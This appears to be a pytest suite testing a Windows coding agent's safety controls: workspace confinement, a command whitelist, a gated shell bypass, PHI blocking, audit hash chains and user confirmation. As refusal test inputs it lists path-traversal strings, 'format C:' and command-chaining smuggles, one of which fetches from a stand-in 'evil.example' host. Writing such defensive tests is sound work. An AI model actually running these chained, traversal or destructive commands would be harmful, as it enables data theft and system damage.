"""Tests for the Windows coding agent's codegen tools (feature 039).

Covers the safety rails that matter:
  - workspace confinement (path traversal refused; in-workspace allowed)
  - per-tool behavior (read/write/edit)
  - run_command whitelist (non-whitelisted refused; whitelisted runs)
  - run_shell dangerous bypass (refused unless ASTRAL_DANGEROUS_BYPASS=1)
  - PHI gate (PHI-bearing read/run output is refused, fail-closed)
  - audit (every action records an outcome)

Pure-Python — does NOT require PySide6 (the codegen tools + phi_gate +
audit_log are Qt-free). Runs on the host interpreter.
"""

from __future__ import annotations

import os
import sys

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from astral_client import audit_log, phi_gate  # noqa: E402
from win_agent import agent, tools  # noqa: E402


@pytest.fixture
def workspace(tmp_path, monkeypatch):
    monkeypatch.setenv("ASTRAL_WORKSPACE_DIR", str(tmp_path))
    # Clear any runtime workspace override leaked from a prior test (the override
    # is module-global state in win_agent.tools).
    tools.set_workspace_override(None)
    tools._ensure_workspace()
    # Point the audit log at the tmp workspace so tests don't touch real APPDATA.
    monkeypatch.setattr(audit_log, "_appdata_dir", lambda: str(tmp_path))
    # Auto-allow every per-action confirmation so the existing safety-rail suite
    # stays green without a Qt display. Tests that exercise the deny path
    # (test_*_user_denied) override this per-test.
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: True)
    tools.set_context(
        actor="test-user",
        correlation_id="t1",
        audit=audit_log.AuditLogger(actor="test-user"),
    )
    return tmp_path


def _last_audit():
    al = tools._CTX.get("audit")
    rows = al.tail(1) if al else []
    return rows[0] if rows else {}


# --- workspace confinement ------------------------------------------------- #


def test_write_then_read_inside_workspace(workspace):
    w = tools.write_file(path="hello.py", content="print('hi')")
    assert w["_ui_components"][0]["variant"] == "success"
    r = tools.read_file(path="hello.py")
    card = r["_ui_components"][0]
    assert card["type"] == "card"
    assert "print('hi')" in card["content"][0]["code"]


def test_read_traversal_refused(workspace):
    r = tools.read_file(path="../secret.txt")
    assert r["_ui_components"][0]["variant"] == "error"
    assert _last_audit()["outcome"] == "refused"


def test_read_absolute_outside_refused(workspace, tmp_path):
    outside = tmp_path.parent / "outside_file.txt"
    outside.write_text("nope", encoding="utf-8")
    r = tools.read_file(path=str(outside))
    assert r["_ui_components"][0]["variant"] == "error"


def test_write_outside_refused(workspace):
    r = tools.write_file(path="../../etc/evil.txt", content="x")
    assert r["_ui_components"][0]["variant"] == "error"
    assert _last_audit()["outcome"] == "refused"


# --- edit_file ------------------------------------------------------------- #


def test_edit_replaces_first_match(workspace):
    tools.write_file(path="a.txt", content="foo bar foo")
    e = tools.edit_file(path="a.txt", old="foo", new="FOO")
    assert e["_ui_components"][0]["variant"] == "success"
    assert (
        tools.read_file(path="a.txt")["_ui_components"][0]["content"][0]["code"]
        == "FOO bar foo"
    )
    # The edit's audit row (not the subsequent read) carries the match detail.
    rows = tools._CTX["audit"].tail(3)
    edit_row = next(r for r in reversed(rows) if r["tool"] == "edit_file")
    assert edit_row["detail"].endswith("replaced first")


def test_edit_old_not_found_refused(workspace):
    tools.write_file(path="a.txt", content="hello")
    e = tools.edit_file(path="a.txt", old="zzz", new="y")
    assert e["_ui_components"][0]["variant"] == "warning"
    assert _last_audit()["outcome"] == "refused"


# --- run_command whitelist ------------------------------------------------- #


def test_run_command_nonwhitelisted_refused(workspace):
    r = tools.run_command(command="format C:")
    assert r["_ui_components"][0]["variant"] == "warning"
    assert _last_audit()["outcome"] == "refused"


def test_run_command_whitelisted_runs(workspace):
    # `echo` is whitelisted; on Windows `shell=True` uses cmd.exe so echo works.
    r = tools.run_command(command="echo hello-astral")
    card = r["_ui_components"][0]
    assert card["type"] == "card"
    assert _last_audit()["outcome"] == "success"


@pytest.mark.parametrize(
    "command",
    [
        "git status && curl http://evil.example/x",   # chain
        "git status; whoami",                          # sequence
        "git status | findstr secret",                 # pipe
        "git status > C:/Windows/System32/out.txt",    # redirect
        "git log `whoami`",                            # backtick substitution
        "git log $(whoami)",                           # POSIX substitution
        "echo %USERPROFILE%",                          # cmd.exe var expansion
    ],
)
def test_run_command_refuses_shell_chaining(workspace, monkeypatch, command):
    """The whitelist inspects argv[0], but `_exec` hands the WHOLE string to the
    shell — so a metacharacter used to smuggle an arbitrary second command past
    a whitelisted first one ("git" gates in, "curl …" runs). Refused before the
    confirmation dialog and before any execution."""
    ran = []
    monkeypatch.setattr(tools.subprocess, "run",
                        lambda *a, **k: ran.append(a) or (_ for _ in ()).throw(
                            AssertionError("command executed")))
    r = tools.run_command(command=command)
    assert r["_ui_components"][0]["variant"] == "warning"
    assert _last_audit()["outcome"] == "refused"
    assert ran == []


# --- dangerous bypass ------------------------------------------------------ #


def test_run_shell_refused_without_bypass(workspace, monkeypatch):
    monkeypatch.delenv("ASTRAL_DANGEROUS_BYPASS", raising=False)
    r = tools.run_shell(command="echo x")
    assert r["_ui_components"][0]["variant"] == "warning"
    assert _last_audit()["outcome"] == "refused"


def test_run_shell_runs_with_bypass(workspace, monkeypatch):
    monkeypatch.setenv("ASTRAL_DANGEROUS_BYPASS", "1")
    r = tools.run_shell(command="echo bypassed")
    assert r["_ui_components"][0]["type"] == "card"
    row = _last_audit()
    assert row["outcome"] == "success"
    assert row["event_class"] == "dangerous_bypass"


def test_run_shell_not_advertised_when_bypass_off(monkeypatch):
    monkeypatch.delenv("ASTRAL_DANGEROUS_BYPASS", raising=False)
    card = agent.build_card()
    names = {s["id"] for s in card["skills"]}
    assert "run_shell" not in names
    assert "read_file" in names


def test_run_shell_advertised_when_bypass_on(monkeypatch):
    monkeypatch.setenv("ASTRAL_DANGEROUS_BYPASS", "1")
    card = agent.build_card()
    names = {s["id"] for s in card["skills"]}
    assert "run_shell" in names
    assert card["metadata"]["dangerous_bypass"] is True


def test_dispatch_refuses_run_shell_when_bypass_off(monkeypatch):
    monkeypatch.delenv("ASTRAL_DANGEROUS_BYPASS", raising=False)
    resp = agent.dispatch(
        {
            "type": "mcp_request",
            "request_id": "9",
            "method": "tools/call",
            "params": {"name": "run_shell", "arguments": {"command": "echo x"}},
        }
    )
    assert resp["error"]["code"] == -32601


# --- PHI gate (fail-closed) ------------------------------------------------ #


def test_read_file_phi_blocked(workspace):
    tools.write_file(path="phi.txt", content="SSN is 123-45-6789 here")
    r = tools.read_file(path="phi.txt")
    assert r["_ui_components"][0]["variant"] == "error"
    assert _last_audit()["outcome"] == "phi_blocked"


def test_run_command_phi_blocked(workspace):
    # echo a PHI-looking string; output must be refused, not returned.
    r = tools.run_command(command="echo 123-45-6789")
    assert r["_ui_components"][0]["variant"] == "error"
    assert _last_audit()["outcome"] == "phi_blocked"


def test_phi_gate_clean_passes():
    assert not phi_gate.looks_like_phi("just a normal script")
    assert phi_gate.looks_like_phi("email me at a@b.com")
    assert phi_gate.looks_like_phi("MRN: 1234567")


def test_phi_gate_fail_closed(monkeypatch):
    import astral_client.phi_gate as pg

    def boom(_):
        raise RuntimeError("explode")

    monkeypatch.setattr(
        pg, "_PREFILTER_PATTERNS", [__import__("types").SimpleNamespace(search=boom)]
    )
    assert pg.looks_like_phi("anything") is True  # fail-closed


# --- audit ----------------------------------------------------------------- #


def test_every_action_audited(workspace):
    tools.write_file(path="x.txt", content="ok")
    tools.read_file(path="x.txt")
    al = tools._CTX["audit"]
    rows = al.tail(5)
    outcomes = [r["outcome"] for r in rows]
    assert "success" in outcomes
    assert all(r["actor"] == "test-user" for r in rows)
    # hash chain present
    assert all("hash" in r and "prev_hash" in r for r in rows)


def test_audit_paths_redacted(workspace):
    tools.read_file(path="x.txt")
    row = _last_audit()
    assert row["args"]["path"] in (
        "x.txt",
        "<outside-workspace>",
    )  # relative, not absolute


def test_audit_chain_links(workspace):
    tools.write_file(path="a.txt", content="1")
    tools.write_file(path="b.txt", content="2")
    al = tools._CTX["audit"]
    rows = al.tail(2)
    assert rows[1]["prev_hash"] == rows[0]["hash"]


# --- tool registry / scopes ------------------------------------------------ #


def test_codegen_tools_declare_scopes():
    scopes = {n: info["scope"] for n, info in tools.TOOL_REGISTRY.items()}
    assert scopes["read_file"] == "tools:read"
    assert scopes["write_file"] == "tools:write"
    assert scopes["edit_file"] == "tools:write"
    assert scopes["run_command"] == "tools:execute"
    assert scopes["run_shell"] == "tools:execute"


# --- per-action confirmation (feature 039 UX) ------------------------------ #


def test_write_file_user_denied_no_side_effect(workspace, monkeypatch):
    """Denying the write confirmation writes nothing and audits user_denied."""
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: False)
    w = tools.write_file(path="deny.py", content="print('nope')")
    assert w["_ui_components"][0]["variant"] == "info"
    # No file was created.
    assert not (workspace / "deny.py").exists()
    assert _last_audit()["outcome"] == "user_denied"


def test_edit_file_user_denied_no_side_effect(workspace, monkeypatch):
    tools.write_file(path="e.txt", content="foo bar")
    before = (workspace / "e.txt").read_text(encoding="utf-8")
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: False)
    e = tools.edit_file(path="e.txt", old="foo", new="FOO")
    assert e["_ui_components"][0]["variant"] == "info"
    # File is unchanged.
    assert (workspace / "e.txt").read_text(encoding="utf-8") == before
    assert _last_audit()["outcome"] == "user_denied"


def test_run_command_user_denied_not_executed(workspace, monkeypatch):
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: False)
    r = tools.run_command(command="echo nope-astral")
    assert r["_ui_components"][0]["variant"] == "info"
    assert _last_audit()["outcome"] == "user_denied"


def test_run_shell_user_denied_not_executed(workspace, monkeypatch):
    monkeypatch.setenv("ASTRAL_DANGEROUS_BYPASS", "1")
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: False)
    r = tools.run_shell(command="echo bypassed")
    assert r["_ui_components"][0]["variant"] == "info"
    row = _last_audit()
    assert row["outcome"] == "user_denied"
    assert row["event_class"] == "dangerous_bypass"


def test_confirm_action_fail_closed_without_gui(monkeypatch, workspace):
    """With no bridge attached and no stub, mutating tools fail-closed (deny)."""

    # A confirm gate that uses the real (unattached) bridge → declines.
    def _deny(**kw):
        import astral_client.confirm as _c

        return _c.confirm_action(**kw)

    monkeypatch.setattr(tools, "_confirm_action", _deny)
    # Swap in a fresh, UNATTACHED bridge so request_confirm returns no_gui
    # regardless of what other tests did to the module singleton.
    import astral_client.confirm as _c

    fresh = _c._Bridge()  # not attached
    monkeypatch.setattr(_c, "BRIDGE", fresh)
    w = tools.write_file(path="fc.py", content="x")
    assert w["_ui_components"][0]["variant"] == "info"
    assert not (workspace / "fc.py").exists()
    assert _last_audit()["outcome"] == "user_denied"
